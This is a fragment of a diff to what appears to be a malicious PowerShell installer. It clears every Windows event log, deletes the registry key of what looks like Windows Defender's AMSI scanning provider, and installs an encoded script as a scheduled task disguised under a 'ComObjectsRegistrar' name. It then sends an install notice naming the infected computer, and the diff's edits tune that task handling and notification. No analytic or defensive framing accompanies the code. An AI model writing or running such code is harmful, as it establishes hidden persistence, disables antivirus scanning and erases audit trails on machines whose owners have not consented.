@@ -202,6 +202,10 @@ function Cleanup {
   Unregister-ScheduledTask 'WinSecurityScheduledCheck' -ErrorAction Ignore
   Unregister-ScheduledTask 'ScheduledSecurityCheck' -ErrorAction Ignore
 
+  $NewTaskFolder='ComObjectsRegistrationManagement'
+  $NewTaskName=$NewTaskFolder + '\' + 'ComObjectsRegistrar'
+  Unregister-ScheduledTask $NewTaskName -ErrorAction Ignore
+
   # logs
   OutString "Clera Logs"
   $null=Get-WinEvent -ListLog * -Force | % { Wevtutil.exe cl $_.LogName }
@@ -213,10 +217,9 @@ function Cleanup {
 # AMSI
 Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force -ErrorAction Ignore 
 
-
 $NewTaskFolder='ComObjectsRegistrationManagement'
+$NewTaskName=$NewTaskFolder + '\' + 'ComObjectsRegistrars'
 New-ScheduledTaskFolder $NewTaskFolder
-$NewTaskName=$NewTaskFolder + '\' + 'ComObjectsRegistrar'
 
 $InstallFromLocal=$false
 
@@ -237,5 +240,5 @@ if($InstallFromLocal)
       Install-EncodedScriptTask $NewTaskName $EncodedScript
 }
 
-Send-InstallNotification "Schd Task Install Notice for $env:COMPUTERNAME" "$FullLogs"
+Send-InstallNotification "Schd Task Install Notice for $env:COMPUTERNAME" "test again, check file" $LogFilePath
 Cleanup
